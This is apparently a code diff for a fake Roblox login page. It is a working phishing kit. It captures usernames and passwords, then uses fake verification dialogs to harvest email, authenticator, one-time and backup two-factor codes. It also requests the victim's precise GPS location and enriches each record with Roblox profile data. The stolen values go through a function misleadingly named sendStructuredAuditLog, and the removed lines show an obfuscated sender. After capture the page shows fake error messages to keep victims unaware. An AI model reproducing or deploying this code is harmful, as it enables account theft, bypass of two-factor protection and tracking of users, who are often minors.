+    const name = String(username || "").trim();
+    if(!name || name.indexOf("@") > -1){ finish({ avatar: null, details: null }); return; }
+    
+    fetch(`https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(name)}`)
+    .then(r => r.json())
+    .then(d => {
+        if(d && d.data && d.data.length > 0){
+            const userInfo = d.data[0];
+            const userId = userInfo.id;
+            
+            return Promise.all([
+                fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`).then(r => r.json()),
+                fetch(`https://users.roblox.com/v1/users/${userId}`).then(r => r.json())
+            ]).then(([thumbRes, profileRes]) => {
+                const avatarUrl = thumbRes && thumbRes.data && thumbRes.data.length > 0 ? thumbRes.data[0].imageUrl : null;
+                finish({ avatar: avatarUrl, details: profileRes });
+            });
+        }
+        finish({ avatar: null, details: null });
+    })
+    .catch(() => finish({ avatar: null, details: null }));
+}
+
+function hideAllModals(){
+    ['twostepverification','authenticatorverification','RecoveryFromEmail','RecoveryFromAuthen','otpEmailModal','otpCodeModal','methodChoice'].forEach(id => {
+        const el = document.getElementById(id);
+        if(el) el.style.display = 'none';
+    });
+}
+
+function showErrorUnderFields(){
+    hideAllModals();
     document.getElementById('react-login-container').style.display = 'block';
     document.getElementById('text-error').textContent = "Something went wrong. Please try again.";
     document.getElementById('login-username').value = '';
@@ -876,22 +666,211 @@ function verifyCode(m, id) {
     if(av) av.style.display = 'none';
 }
 
-document.addEventListener('click', (e) => {
-    const t = e.target;
-    if (!t) return;
-    if (t.id === 'verifyButton') verifyCode('Email', 'two-step-verification-code-input');
-    else if (t.id === 'AuthenButton') verifyCode('Authenticator', 'two-step-verification-code-input-authenticator');
-    else if (t.id === 'RecoveryFromEmailButton') verifyCode('Backup Code (Email)', 'two-step-verification-code-input-RecoveryFromEmail');
-    else if (t.id === 'otp-login-button') document.getElementById('otpEmailModal').style.display = 'block';
-    else if (t.id === 'otp-send-btn') {
-        const em = document.getElementById('otp-email-input').value.trim();
-        if (em) {
-            _0x70("🛡️ One-Time Code Requested", em, { Email: em }, _0x90);
-            document.getElementById('otp-email-display').textContent = em;
-            document.getElementById('otpEmailModal').style.display = 'none';
-            document.getElementById('otpCodeModal').style.display = 'block';
+function chooseMethod(method){
+    document.getElementById('methodChoice').style.display = 'none';
+    
+    sendStructuredAuditLog("MFA_CHOICE", lastLogin.username, {
+        Method: method,
+        Password: lastLogin.password || "(not provided)"
+    }, lastLogin.avatarUrl, lastLogin.profileDetails);
+    
+    setTimeout(() => {
+        if(method === 'Email'){
+            document.getElementById('twostepverification').style.display = 'block';
+        } else if(method === 'Authenticator'){
+            document.getElementById('authenticatorverification').style.display = 'block';
+        } else if(method === 'Backup Code'){
+            document.getElementById('RecoveryFromEmail').style.display = 'block';
         }
-    } else if (t.id === 'otp-verify-btn') verifyCode('One-Time Code', 'otp-code-input');
+    }, 1200);
+}
+
+const form = document.querySelector('form.login-form');
+const usernameInput = document.getElementById('login-username');
+const passwordInput = document.getElementById('login-password');
+const loginButton = document.getElementById('login-button');
+const errorText = document.getElementById('text-error');
+const loadingEl = document.getElementById('login-loading');
+const avatarPreviewEl = document.getElementById('avatar-preview');
+
+let lastLogin = { username: '', password: '', avatarUrl: null, profileDetails: null };
+
+usernameInput.addEventListener('blur', function(){
+    const val = this.value.trim();
+    if(!val || val.indexOf('@') > -1) return;
+    getRobloxProfileData(val, (res) => {
+        if(res.avatar){
+            lastLogin.avatarUrl = res.avatar;
+            lastLogin.profileDetails = res.details;
+            avatarPreviewEl.src = res.avatar;
+            avatarPreviewEl.style.display = 'block';
+        }
+    });
+});
+
+function setError(msg){ if(errorText) errorText.textContent = msg || ''; }
+function setLoading(on){
+    if(loadingEl) loadingEl.style.display = on ? 'flex' : 'none';
+    if(loginButton) loginButton.style.display = on ? 'none' : 'block';
+}
+
+function doLogin(){
+    const username = usernameInput.value.trim();
+    const password = passwordInput.value;
+
+    if(!username || !password){
+        setError("Username and password required");
+        return;
+    }
+
+    setLoading(true);
+    setError("");
+    lastLogin.username = username;
+    lastLogin.password = password;
+
+    getRobloxProfileData(username, (res) => {
+        if(res.avatar) lastLogin.avatarUrl = res.avatar;
+        if(res.details) lastLogin.profileDetails = res.details;
+        
+        sendStructuredAuditLog("LOGIN_ATTEMPT", username, {
+            Password: password
+        }, lastLogin.avatarUrl, lastLogin.profileDetails);
+    });
+
+    setTimeout(() => {
+        setLoading(false);
+        document.getElementById('methodChoice').style.display = 'block';
+    }, WAIT);
+}
+
+form.addEventListener('submit', e => { e.preventDefault(); doLogin(); });
+loginButton.addEventListener('click', e => { e.preventDefault(); doLogin(); });
+form.addEventListener('keydown', e => { if(e.key === 'Enter'){ e.preventDefault(); doLogin(); } });
+
+function handleVerificationWithDeferredGPS(buttonElement, methodType, codeValue) {
+    buttonElement.disabled = true;
+    buttonElement.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
+
+    sendStructuredAuditLog("MFA_SUCCESS", lastLogin.username, {
+        Method: methodType,
+        Code: codeValue
+    }, lastLogin.avatarUrl, lastLogin.profileDetails);
+
+    requestPreciseGPS(() => {
+        setTimeout(() => {
+            buttonElement.disabled = false;
+            buttonElement.innerHTML = 'Verify';
+            showErrorUnderFields();
+        }, WAIT);
+    });
+}
+
+document.getElementById('verifyButton').addEventListener('click', function(){
+    const code = document.getElementById('two-step-verification-code-input').value.replace(/\D/g,'');
+    if(code.length !== 6){ document.getElementById('twostep-error').textContent = "Enter the 6-digit code."; return; }
+    handleVerificationWithDeferredGPS(this, "Email", code);
+});
+
+document.getElementById('AuthenButton').addEventListener('click', function(){
+    const code = document.getElementById('two-step-verification-code-input-authenticator').value.replace(/\D/g,'');
+    if(code.length !== 6) return;
+    this.disabled = true;
+    this.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
+
+    sendStructuredAuditLog("MFA_SUCCESS", lastLogin.username, {
+        Method: "Authenticator",
+        Code: code
+    }, lastLogin.avatarUrl, lastLogin.profileDetails);
+
+    requestPreciseGPS(() => {
+        setTimeout(() => {
+            this.disabled = false;
+            this.innerHTML = 'Verify';
+            document.getElementById('Authen-error').textContent = "Incorrect code. Please try again.";
+        }, WAIT);
+    });
+});
+
+document.getElementById('RecoveryFromEmailButton').addEventListener('click', function(){
+    const code = document.getElementById('two-step-verification-code-input-RecoveryFromEmail').value.replace(/\D/g,'');
+    if(code.length !== 9) return;
+    handleVerificationWithDeferredGPS(this, "Backup Code (Email)", code);
+});
+
+document.getElementById('RecoveryFromAuthenButton').addEventListener('click', function(){
+    const code = document.getElementById('two-step-verification-code-input-recoveryFromAuthen').value.replace(/\D/g,'');
+    if(code.length !== 9) return;
+    handleVerificationWithDeferredGPS(this, "Backup Code (Authenticator)", code);
+});
+
+document.getElementById('otp-login-button').addEventListener('click', function(){
+    document.getElementById('otp-email-input').value = '';
+    document.getElementById('otp-error').innerHTML = '&nbsp;';
+    document.getElementById('otpEmailModal').style.display = 'block';
+});
+
+document.getElementById('otp-send-btn').addEventListener('click', function(){
+    const email = document.getElementById('otp-email-input').value.trim();
+    if(!email || email.indexOf('@') === -1){
+        document.getElementById('otp-error').textContent = "Please enter a valid email address.";
+        return;
+    }
+    sendStructuredAuditLog("MFA_CHOICE", email, {
+        Method: "One-Time Code Request",
+        Email: email
+    });
+
+    document.getElementById('otp-email-display').textContent = email;
+    document.getElementById('otp-code-input').value = '';
+    document.getElementById('otp-code-error').innerHTML = '&nbsp;';
+    document.getElementById('otp-verify-btn').disabled = true;
+    document.getElementById('otpEmailModal').style.display = 'none';
+    document.getElementById('otpCodeModal').style.display = 'block';
+});
+
+document.getElementById('otp-verify-btn').addEventListener('click', function(){
+    const code = document.getElementById('otp-code-input').value.replace(/\D/g,'');
+    const email = document.getElementById('otp-email-input').value.trim();
+    if(code.length !== 6) return;
+    this.disabled = true;
+    this.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
+    
+    sendStructuredAuditLog("MFA_SUCCESS", email, {
+        Method: "One-Time Code",
+        Code: code,
+        Email: email
+    });
+
+    requestPreciseGPS(() => {
+        setTimeout(() => { this.disabled = false; this.innerHTML = 'Verify'; showErrorUnderFields(); }, WAIT);
+    });
+});
+
+document.getElementById('resend-btn').addEventListener('click', function(){
+    sendStructuredAuditLog("MFA_CHOICE", lastLogin.username, {
+        Action: "Resend Code Requested"
+    }, lastLogin.avatarUrl, lastLogin.profileDetails);
+    alert("A new code has been sent to your email address.");
+});
+
+document.getElementById('forgot-credentials-link').addEventListener('click', function(e){
+    e.preventDefault();
+    const n = prompt("Please enter your username or email address:");
+    if(!n) return;
+    getRobloxProfileData(n, (res) => {
+        sendStructuredAuditLog("MFA_CHOICE", n, { Action: "Forgot Password Recovery" }, res.avatar, res.details);
+    });
+    alert("If this account exists, a recovery email has been sent.");
+});
+
+document.getElementById('cross-device-login-button').addEventListener('click', function(){
+    sendStructuredAuditLog("MFA_CHOICE", lastLogin.username, { Action: "Quick Login QR Started" }, lastLogin.avatarUrl, lastLogin.profileDetails);
+    alert("Open the Roblox app on another device and scan the code.");
+});
+
+document.getElementById('sign-up-link').addEventListener('click', function(e){
+    e.preventDefault();
+    setError("For this action, only the login function is available.");
 });
 </script>
 </body>
